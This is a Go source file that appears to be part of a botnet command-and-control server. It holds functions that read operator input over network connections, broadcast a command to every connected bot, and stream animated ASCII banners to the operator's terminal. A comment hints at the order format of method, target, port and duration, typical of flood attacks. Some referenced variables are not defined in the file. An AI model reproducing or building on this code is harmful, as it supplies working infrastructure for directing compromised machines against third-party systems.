package main

import (
	"bufio"
	"fmt"
	"io/ioutil"
	"math/rand"
	"net"
	"net/textproto"
	"os"
	"time"
)

func read_line(connection net.Conn) (string, error) {
	return textproto.NewReader(bufio.NewReader(connection)).ReadLine()
}

func input(content string, connection net.Conn) string {
	connection.Write([]byte(fmt.Sprintf("%s%s", reset, content)))
	response, err := read_line(connection)

	if err != nil {
		return "err"
	}

	return response
}

func send_all_bots(command string) {
	sent := 0
	fail := 0

	for _, bot := range bots {
		if bot.connected {
			// ! {args[1].upper()} {args[2]} {args[3]} {t}
			_, err := bot.connection.Write([]byte(fmt.Sprintf("%s\n", command)))

			if err != nil {
				fail++
				bot.connected = false
			} else {
				sent++
			}
		}
	}

	fmt.Printf("*! Command '%s' was sent to %d bots (%d fails)\n", command, sent, fail)
}

func send_gif(connection net.Conn) {
	files, _ := ioutil.ReadDir("./tfx_gif/")
	gifs := []string{}

	for _, file := range files {
		gifs = append(gifs, file.Name())
	}

	gif := gifs[rand.Intn(len(gifs))]

	file, err := os.Open(fmt.Sprintf("./tfx_gif/%s", gif))

	if err != nil {
		fmt.Printf("*! Error: %s\n", err)
		return
	}

	defer file.Close()
	scanner := bufio.NewScanner(file)

	for scanner.Scan() {
		text := scanner.Text()

		if text == "<<sleep(0.060)>><<$clear>>" {
			time.Sleep(60 * time.Millisecond)
			connection.Write([]byte(clear))
		} else {
			connection.Write([]byte(fmt.Sprintf("%s", text)))
		}

	}
}
